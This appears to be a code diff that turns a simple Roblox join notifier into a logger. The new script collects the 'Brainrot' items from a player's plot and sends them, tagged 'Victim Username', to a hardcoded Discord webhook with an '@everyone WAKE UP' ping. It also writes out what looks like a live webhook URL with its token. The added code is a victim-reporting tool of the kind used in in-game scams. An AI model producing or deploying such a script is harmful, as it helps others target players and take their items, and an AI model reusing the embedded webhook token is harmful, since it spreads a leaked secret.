@@ -1,33 +1,67 @@
--- Get the HttpService service
-local httpService = game:GetService("HttpService")
+local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
 
--- Replace with your actual Discord webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" 
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"
 
--- Function to send a message to Discord
-local function sendMessageToDiscord(messageText)
-    -- Create the data table for Discord
-    local contentData = {
-        ["content"] = messageText 
+-- Собираем все Brainrots из Plot "1"
+local function getBrainrotsText()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return "No Plots found." end
+
+    local plot = plots:FindFirstChild("1")
+    if not plot or not plot:FindFirstChild("Brainrots") then return "No Brainrots found." end
+
+    local brainrotText = ""
+    for i = 1, 17 do
+        local br = plot.Brainrots:FindFirstChild(tostring(i))
+        if br and br:FindFirstChild("Brainrot") then
+            local ui = br.Brainrot:FindFirstChild("PlatformUI")
+            if ui and ui:FindFirstChild("Title") then
+                local title = ui.Title
+                if title.Text and title.Text ~= "" then
+                    brainrotText = brainrotText .. "Brainrot " .. i .. ": " .. title.Text .. "\n"
+                end
+            end
+        end
+    end
+
+    if brainrotText == "" then
+        brainrotText = "No Brainrots found."
+    end
+    return brainrotText
+end
+
+-- Отправка в Discord Embed
+local function sendDiscordEmbed(victimName, brainrotText)
+    local payload = {
+        content = "--[[@everyone]] WAKE UP",
+        embeds = {{
+            title = "Brainrot | Elly",
+            color = 65280, -- зелёный
+            fields = {
+                { name = "Victim Username:", value = victimName },
+                { name = "Item List:", value = brainrotText }
+            },
+            footer = { text = "Отправлено через Roblox" }
+        }}
     }
 
-    -- Encode the data table into a JSON string
-    local jsonData = httpService:JSONEncode(contentData)
-
-    -- Send the data to the webhook URL using a POST request
-    local success, result = pcall(function()
-        httpService:PostAsync(webhookUrl, jsonData)
+    local body = HttpService:JSONEncode(payload)
+    local success, err = pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
     end)
 
-    -- Check if the request was successful (optional)
     if success then
-        print("Message sent successfully!")
+        print("✅ Embed sent!")
     else
-        warn("Failed to send message: " .. result)
+        warn("❌ Failed to send embed:", err)
     end
 end
 
--- Example: Send a message when a player joins the game
-game.Players.PlayerAdded:Connect(function(plr)
-    sendMessageToDiscord(plr.Name .. " has joined the game!")
-end)
+-- Пример использования: берём первого игрока в игре
+local victim = Players:GetPlayers()[1]
+if victim then
+    local brainrots = getBrainrotsText()
+    sendDiscordEmbed(victim.Name, brainrots)
+end
